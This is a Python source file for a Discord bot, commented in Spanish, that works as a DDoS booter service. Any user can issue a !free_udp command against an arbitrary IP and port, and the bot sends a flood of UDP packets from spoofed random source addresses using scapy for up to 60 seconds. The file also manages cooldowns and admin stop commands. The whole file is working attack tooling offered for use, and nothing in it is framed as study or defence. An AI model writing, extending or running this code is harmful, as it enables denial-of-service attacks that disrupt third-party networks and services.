import discord
from discord.ext import commands
import asyncio
import threading
import time
import random
from scapy.all import IP, UDP, Raw, send

TOKEN = 'TU_TOKEN_DISCORD'  # Reemplaza con tu token

INTENTS = discord.Intents.default()
INTENTS.message_content = True

bot = commands.Bot(command_prefix='!', intents=INTENTS)

active_attacks = {}
cooldowns = {}
global_attack_running = False
admin_id = 1367535670410875070  # Cambia esto por tu ID real

def spoofed_udp_attack(ip, port, duration, stop_event):
    timeout = time.time() + duration

    while time.time() < timeout and not stop_event.is_set():
        try:
            for _ in range(100):  # Intensidad
                spoofed_ip = f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
                packet = IP(src=spoofed_ip, dst=ip) / UDP(sport=random.randint(1024, 4000), dport=port) / Raw(load=random._urandom(1400))
                send(packet, verbose=False)
        except Exception as e:
            continue

@bot.event
async def on_ready():
    print(f'✅ Bot conectado como {bot.user.name}')

@bot.command()
async def free_udp(ctx, ip: str = None, port: int = None, duration: int = None):
    global global_attack_running

    if not ip or not port or not duration:
        await ctx.send("❗ Uso correcto: `!free_udp <ip> <port> <time>` (máx 60s)")
        return

    if ip == "127.0.0.1":
        await ctx.send("🚫 No puedes atacar a `127.0.0.1`.")
        return

    if duration > 60:
        await ctx.send("⚠️ Tiempo máximo permitido: 60 segundos.")
        return

    if ctx.author.id in active_attacks:
        await ctx.send("⛔ Ya tienes un ataque activo.")
        return

    if ctx.author.id in cooldowns:
        await ctx.send("⏳ Debes esperar 30 segundos antes de volver a atacar.")
        return

    if global_attack_running:
        await ctx.send("⚠️ Solo puede haber un ataque global activo. Espera a que finalice.")
        return

    global_attack_running = True
    stop_event = threading.Event()
    active_attacks[ctx.author.id] = stop_event

    embed = discord.Embed(
        title="🚀 Ataque Iniciado",
        description=(
            f"**Método:** UDP-FREE \n"
            f"**IP:** `{ip}`\n"
            f"**Puerto:** `{port}`\n"
            f"**Tiempo:** `{duration}s`\n"
            f"**Usuario:** <@{ctx.author.id}>"
        ),
        color=discord.Color.red()
    )
    await ctx.send(embed=embed)

    thread = threading.Thread(target=spoofed_udp_attack, args=(ip, port, duration, stop_event))
    thread.start()

    await asyncio.sleep(duration)

    if not stop_event.is_set():
        stop_event.set()
        await ctx.send(f"✅ Ataque finalizado automáticamente para <@{ctx.author.id}>.")

    del active_attacks[ctx.author.id]
    cooldowns[ctx.author.id] = time.time()
    global_attack_running = False

    await asyncio.sleep(30)
    cooldowns.pop(ctx.author.id, None)

@bot.command()
async def stop(ctx):
    if ctx.author.id not in active_attacks:
        await ctx.send("❌ No tienes ningún ataque activo.")
        return

    active_attacks[ctx.author.id].set()
    await ctx.send("🛑 Ataque detenido. Espera 30 segundos antes de otro ataque.")

    del active_attacks[ctx.author.id]
    cooldowns[ctx.author.id] = time.time()

    global global_attack_running
    global_attack_running = False

    await asyncio.sleep(30)
    cooldowns.pop(ctx.author.id, None)

@bot.command()
async def stopall(ctx):
    if ctx.author.id != admin_id:
        await ctx.send("❌ Solo el administrador puede usar este comando.")
        return

    for stop_event in active_attacks.values():
        stop_event.set()
    active_attacks.clear()

    global global_attack_running
    global_attack_running = False

    await ctx.send("🛑 Todos los ataques han sido detenidos por el administrador.")

@bot.command()
async def dhelp(ctx):
    embed = discord.Embed(title="📘 Comandos disponibles", color=discord.Color.blue())
    embed.add_field(name="!free_udp <ip> <port> <time>", value="Inicia un ataque UDP-FREE (máximo 60s)", inline=False)
    embed.add_field(name="!stop", value="Detiene tu ataque y activa cooldown de 30s", inline=False)
    embed.add_field(name="!stopall", value="(Solo admin) Detiene todos los ataques activos", inline=False)
    await ctx.send(embed=embed)

bot.run(TOKEN)
